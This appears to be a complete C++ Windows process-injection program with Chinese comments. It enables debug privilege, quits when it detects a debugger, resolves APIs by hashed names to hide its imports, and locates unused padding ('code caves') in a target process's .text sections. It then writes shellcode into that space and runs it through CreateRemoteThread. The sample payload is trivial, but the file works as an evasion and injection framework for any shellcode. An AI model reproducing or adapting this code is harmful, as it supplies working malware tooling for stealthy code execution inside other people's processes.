#include <windows.h>
#include <iostream>
#include <vector>
#include "EnableDebugPrivilege.h"
#include "IsDebugging.h"
#include "Hash.h"
#include "GetProcAddress.h"

// ============================================================
// Shellcode
// ============================================================
unsigned char shellcode[] = {
    0xB8, 0x2A, 0x00, 0x00, 0x00,
    0xC3
};
SIZE_T shellcodeSize = sizeof(shellcode);

// ============================================================
// 函数指针类型定义
// ============================================================
typedef HANDLE (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL   (WINAPI *pEnumProcessModules)(HANDLE, HMODULE*, DWORD, LPDWORD);
typedef DWORD  (WINAPI *pGetModuleBaseNameA)(HANDLE, HMODULE, LPSTR, DWORD);
typedef BOOL   (WINAPI *pReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
typedef BOOL   (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE (WINAPI *pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
                                              LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL   (WINAPI *pCloseHandle)(HANDLE);

// ============================================================
// 函数指针容器
// ============================================================
struct ApiFuncs {
    pOpenProcess           OpenProcess;
    pEnumProcessModules    EnumProcessModules;
    pGetModuleBaseNameA    GetModuleBaseNameA;
    pReadProcessMemory     ReadProcessMemory;
    pWriteProcessMemory    WriteProcessMemory;
    pCreateRemoteThread    CreateRemoteThread;
    pWaitForSingleObject   WaitForSingleObject;
    pCloseHandle           CloseHandle;
    bool                   valid;
};

__declspec(noinline) ApiFuncs InitApiFuncs() {
    ApiFuncs f{};
    DWORD hKernel32 = NHash32::hash("kernel32.dll");
    DWORD hPsapi    = NHash32::hash("psapi.dll");

    f.OpenProcess        = (pOpenProcess)       GetProcAddressEx(hKernel32, NHash32::hash("OpenProcess"));
    f.ReadProcessMemory  = (pReadProcessMemory) GetProcAddressEx(hKernel32, NHash32::hash("ReadProcessMemory"));
    f.WriteProcessMemory = (pWriteProcessMemory)GetProcAddressEx(hKernel32, NHash32::hash("WriteProcessMemory"));
    f.CreateRemoteThread = (pCreateRemoteThread)GetProcAddressEx(hKernel32, NHash32::hash("CreateRemoteThread"));
    f.WaitForSingleObject= (pWaitForSingleObject)GetProcAddressEx(hKernel32, NHash32::hash("WaitForSingleObject"));
    f.CloseHandle        = (pCloseHandle)       GetProcAddressEx(hKernel32, NHash32::hash("CloseHandle"));

    // psapi.dll 里的函数（Win7 之后也导出于 kernel32，但为了保险用 psapi）
    f.EnumProcessModules = (pEnumProcessModules)GetProcAddressEx(hPsapi, NHash32::hash("EnumProcessModules"));
    f.GetModuleBaseNameA = (pGetModuleBaseNameA)GetProcAddressEx(hPsapi, NHash32::hash("GetModuleBaseNameA"));

    // 如果 psapi 找不到，退回 kernel32（Win7+ 有转发导出）
    if (!f.EnumProcessModules)
        f.EnumProcessModules = (pEnumProcessModules)GetProcAddressEx(hKernel32, NHash32::hash("K32EnumProcessModules"));
    if (!f.GetModuleBaseNameA)
        f.GetModuleBaseNameA = (pGetModuleBaseNameA)GetProcAddressEx(hKernel32, NHash32::hash("K32GetModuleBaseNameA"));

    f.valid = f.OpenProcess && f.EnumProcessModules && f.GetModuleBaseNameA
           && f.ReadProcessMemory && f.WriteProcessMemory
           && f.CreateRemoteThread && f.WaitForSingleObject && f.CloseHandle;
    return f;
}

// ============================================================
// Code Cave 扫描（用函数指针版）
// ============================================================
__declspec(noinline)
LPVOID FindCodeCave(const ApiFuncs& f, HANDLE hProcess, HMODULE hModule, SIZE_T needSize) {
    BYTE* moduleBase = (BYTE*)hModule;

    BYTE localDos[0x40] = {0};
    if (!f.ReadProcessMemory(hProcess, moduleBase, localDos, 0x40, NULL))
        return nullptr;

    IMAGE_DOS_HEADER* pDos = (IMAGE_DOS_HEADER*)localDos;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    BYTE localNt[0x108] = {0};
    if (!f.ReadProcessMemory(hProcess, moduleBase + pDos->e_lfanew,
                             localNt, 0x108, NULL))
        return nullptr;

    IMAGE_NT_HEADERS* pNt = (IMAGE_NT_HEADERS*)localNt;
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    DWORD sectionAlignment = pNt->OptionalHeader.SectionAlignment;
    WORD numberOfSections = pNt->FileHeader.NumberOfSections;
    WORD sizeOfOptionalHeader = pNt->FileHeader.SizeOfOptionalHeader;
    DWORD sectionTableOffset = pDos->e_lfanew + 4 + 20 + sizeOfOptionalHeader;

    for (WORD i = 0; i < numberOfSections; i++) {
        IMAGE_SECTION_HEADER section;
        if (!f.ReadProcessMemory(hProcess,
                                 moduleBase + sectionTableOffset + i * sizeof(IMAGE_SECTION_HEADER),
                                 &section, sizeof(section), NULL))
            return nullptr;

        if (strncmp((char*)section.Name, ".text", 5) != 0) continue;

        BYTE* sectionStart = moduleBase + section.VirtualAddress;
        DWORD virtualSize = section.Misc.VirtualSize;
        DWORD alignedSize = ((virtualSize + sectionAlignment - 1) / sectionAlignment) * sectionAlignment;
        DWORD caveSize = alignedSize - virtualSize;

        if (caveSize < needSize) continue;

        BYTE* caveStart = sectionStart + virtualSize;
        std::vector<BYTE> caveBuffer(caveSize);
        if (!f.ReadProcessMemory(hProcess, caveStart, caveBuffer.data(), caveSize, NULL))
            return nullptr;

        bool isClean = true;
        for (DWORD j = 0; j < caveSize; j++) {
            if (caveBuffer[j] != 0x00 && caveBuffer[j] != 0xCC) {
                isClean = false;
                break;
            }
        }
        if (!isClean) continue;

        return caveStart;
    }
    return nullptr;
}

// ============================================================
// main
// ============================================================
int main() {
    EnableDebugPrivilege();

    if (IsDebuggingA()) {
        std::cerr << "[-] 检测到调试器" << std::endl;
        return 0;
    }

    ApiFuncs f = InitApiFuncs();
    if (!f.valid) {
        std::cerr << "[-] 函数解析失败" << std::endl;
        return 1;
    }
    std::cout << "[+] 所有函数解析成功" << std::endl;

    DWORD pid;
    std::cout << "[*] 请输入目标进程 PID: ";
    std::cin >> pid;

    HANDLE hProcess = f.OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
        PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD,
        FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess 失败: " << GetLastError() << std::endl;
        return 1;
    }

    HMODULE modules[1024];
    DWORD needed = 0;
    if (!f.EnumProcessModules(hProcess, modules, sizeof(modules), &needed)) {
        std::cerr << "[-] EnumProcessModules 失败" << std::endl;
        f.CloseHandle(hProcess);
        return 1;
    }
    DWORD moduleCount = needed / sizeof(HMODULE);

    LPVOID caveAddr = nullptr;
    for (DWORD i = 0; i < moduleCount; i++) {
        char modName[MAX_PATH] = {0};
        f.GetModuleBaseNameA(hProcess, modules[i], modName, MAX_PATH);
        std::cout << "[" << i << "] 检查 " << modName << std::endl;

        caveAddr = FindCodeCave(f, hProcess, modules[i], shellcodeSize);
        if (caveAddr) {
            std::cout << "[+] 在 " << modName << " 中找到空隙: 0x"
                      << std::hex << (uintptr_t)caveAddr << std::dec << std::endl;
            break;
        }
    }

    if (!caveAddr) {
        std::cerr << "[-] 未找到合适的空隙" << std::endl;
        f.CloseHandle(hProcess);
        return 1;
    }

    if (!f.WriteProcessMemory(hProcess, caveAddr, shellcode, shellcodeSize, NULL)) {
        std::cerr << "[-] WriteProcessMemory 失败" << std::endl;
        f.CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] Shellcode 写入成功（无需 VirtualProtectEx）" << std::endl;

    HANDLE hThread = f.CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)caveAddr,
        NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread 失败: " << GetLastError() << std::endl;
        f.CloseHandle(hProcess);
        return 1;
    }

    f.WaitForSingleObject(hThread, INFINITE);
    f.CloseHandle(hThread);
    f.CloseHandle(hProcess);

    std::cout << "[+] 注入完成" << std::endl;
    system("pause");
    return 0;
}